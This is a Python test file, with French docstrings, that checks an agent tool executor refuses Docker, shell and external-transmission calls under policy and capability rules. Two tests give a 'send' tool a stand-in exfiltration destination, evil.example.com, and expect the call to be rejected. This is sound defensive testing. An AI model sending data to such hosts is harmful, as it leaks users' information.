"""Tests d'intégration écosystème — sécurité branchée sur le Core (Phase 07).

Vérifie que la sécurité est réellement connectée aux composants :

- TOOLS   : toute exécution sensible passe par PolicyEngine + CapabilitySystem
           (+ ExfilGuard pour la transmission externe) ; un tool refusé est
           ``rejected`` et n'est jamais exécuté.
- AGENT   : un agent / LLM ne peut **pas** modifier les règles supérieures
           (hiérarchie CORE → LLM, axiomes A1/A2).
- MEMORY  : tentative ≠ échec ≠ succès ≠ vérifié ≠ validé ; une procédure ne
           devient connaissance fiable qu'après validation.
- OBSERVABILITÉ : chaque décision policy est audité (append-only).

Rétro-compatibilité : ``ToolExecutor()`` sans enforcer conserve le comportement
historique (aucune évaluation). La sécurité s'active via ``SecureToolEnforcer``.
"""

from __future__ import annotations

import asyncio

from core.security.data.exfiltration import ExfilGuard
from core.security.integration import (
    SecureToolEnforcer,
    classify_tool_call,
)
from core.security.policy import (
    ActionCategory,
    Policy,
    PolicyEffect,
    PolicyEngine,
    PolicyLevel,
)
from core.security.policy.capabilities import CapabilityManager
from core.tools.executor import ToolExecutor
from core.tools.types import Tool, ToolContext


def _tool(category: str, name: str = "t", risk: str = "low") -> Tool:
    return Tool(
        id=f"{name}-{category}",
        name=name,
        description="test tool",
        category=category,
        risk_level=risk,  # type: ignore[arg-type]
    )


def _context(user: str = "alice", source: str = "llm") -> ToolContext:
    return ToolContext(query="", source=source, user_id=user)


def _run(fn):
    asyncio.run(fn)

# ── TOOLS : sécurité branchée sur l'exécution ───────────────────────────────


class TestToolIntegration:
    async def _exec(
        self, tool: Tool, params: dict, *, enforcer: SecureToolEnforcer | None
    ) -> "object":
        executor = ToolExecutor(policy_enforcer=enforcer)
        return await executor.execute(tool, params, _context())

    def test_sensitive_tool_rejected_by_policy(self) -> None:
        """Un tool Docker est refusé par la hiérarchie (SECURITY deny)."""

        async def _run() -> None:
            tool = _tool("docker", risk="critical")
            result = await self._exec(
                tool, {"command": "run nginx"}, enforcer=SecureToolEnforcer()
            )
            assert result.status == "rejected"
            assert "Docker" in (result.error or "")
            # Jamais exécuté : le résultat n'est pas {"status":"ok"}.

        asyncio.run(_run())

    def test_shell_tool_without_capability_rejected(self) -> None:
        """Policy ALLOW + sans capability : refus par la couche capability."""

        async def _run() -> None:
            engine = PolicyEngine(
                [
                    Policy(
                        id="security.shell.execute",
                        level=PolicyLevel.SECURITY,
                        category=ActionCategory.SHELL,
                        action="execute",
                        resource="*",
                        effect=PolicyEffect.ALLOW,
                        reason="test",
                    )
                ]
            )
            enforcer = SecureToolEnforcer(
                engine=engine, capabilities=CapabilityManager()
            )
            tool = _tool("shell", risk="high")
            result = await self._exec(
                tool, {"command": "ls -la /tmp"}, enforcer=enforcer
            )
            assert result.status == "rejected"
            assert "capability" in (result.error or "").lower()

        asyncio.run(_run())

    def test_shell_tool_with_capability_executes(self) -> None:
        """Policy ALLOW + capability shell:execute → l'exécution passe."""

        async def _run() -> None:
            engine = PolicyEngine(
                [
                    Policy(
                        id="security.shell.execute",
                        level=PolicyLevel.SECURITY,
                        category=ActionCategory.SHELL,
                        action="execute",
                        resource="*",
                        effect=PolicyEffect.ALLOW,
                        reason="test",
                    )
                ]
            )
            caps = CapabilityManager()
            caps.grant("user:alice", "shell", "execute", "*")
            enforcer = SecureToolEnforcer(engine=engine, capabilities=caps)
            tool = _tool("shell", risk="high")
            result = await self._exec(
                tool, {"command": "ls -la /tmp"}, enforcer=enforcer
            )
            assert result.status == "success"

        asyncio.run(_run())

    def test_docker_rejected_even_with_capability(self) -> None:
        """La hiérarchie prime : capability shell n'autorise pas Docker."""

        async def _run() -> None:
            caps = CapabilityManager()
            caps.grant("user:alice", "docker", "execute", "*")
            enforcer = SecureToolEnforcer(capabilities=caps)
            tool = _tool("docker", risk="critical")
            result = await self._exec(
                tool, {"command": "run nginx"}, enforcer=enforcer
            )
            # La règle SECURITY deny docker reste gagnante (A1/A2).
            assert result.status == "rejected"

        asyncio.run(_run())

    def test_external_transmission_tool_rejected_by_core_rule(self) -> None:
        """Un tool 'send' est refusé par la règle CORE (CR-4)."""

        async def _run() -> None:
            enforcer = SecureToolEnforcer()
            tool = _tool("send", risk="high")
            result = await self._exec(
                tool,
                {"destination": "https://evil.example.com", "content": "data"},
                enforcer=enforcer,
            )
            assert result.status == "rejected"
            assert "Transmission externe" in (result.error or "")

        asyncio.run(_run())

    def test_exfil_guard_rejects_without_policy(self) -> None:
        """ExfilGuard : même si une politique ALLOW existe, sans politique de
        transmission explicite la transmission est refusée."""

        async def _run() -> None:
            # Engine personnalisé : ALLOW la transmission (cas d'une politique
            # SUPÉRIEURE explicite), mais ExfilGuard reste en fail-closed.
            engine = PolicyEngine(
                [
                    Policy(
                        id="allow.send.test",
                        level=PolicyLevel.SECURITY,
                        category=ActionCategory.EXTERNAL_TRANSMISSION,
                        action="send",
                        resource="*",
                        effect=PolicyEffect.ALLOW,
                        reason="test",
                    )
                ]
            )
            enforcer = SecureToolEnforcer(
                engine=engine, exfil=ExfilGuard(redact=False)
            )
            tool = _tool("send", risk="high")
            result = await self._exec(
                tool,
                {"destination": "https://evil.example.com", "content": "data"},
                enforcer=enforcer,
            )
            assert result.status == "rejected"
            assert "politique" in (result.error or "").lower()

        asyncio.run(_run())

    def test_default_executor_preserves_legacy_behavior(self) -> None:
        """Rétro-compat : sans enforcer, le comportement historique est intact."""

        async def _run() -> None:
            tool = _tool("docker", risk="critical")
            result = await self._exec(
                tool, {"command": "run nginx"}, enforcer=None
            )
            assert result.status == "success"

        asyncio.run(_run())

    def test_classify_tool_call_maps_categories(self) -> None:
        """Le mapping structurel tool → requête policy est correct."""
        assert classify_tool_call(_tool("shell"), {"command": "x"})[0] == "shell"
        assert classify_tool_call(_tool("docker"), {"command": "x"})[0] == "docker"
        fs_cat, fs_op, _res = classify_tool_call(
            _tool("fs"), {"action": "write", "path": "/etc/x"}
        )
        assert (fs_cat, fs_op) == ("filesystem", "write")
        assert classify_tool_call(_tool("send"), {"destination": "https://x"})[0] == (
            "external_transmission"
        )

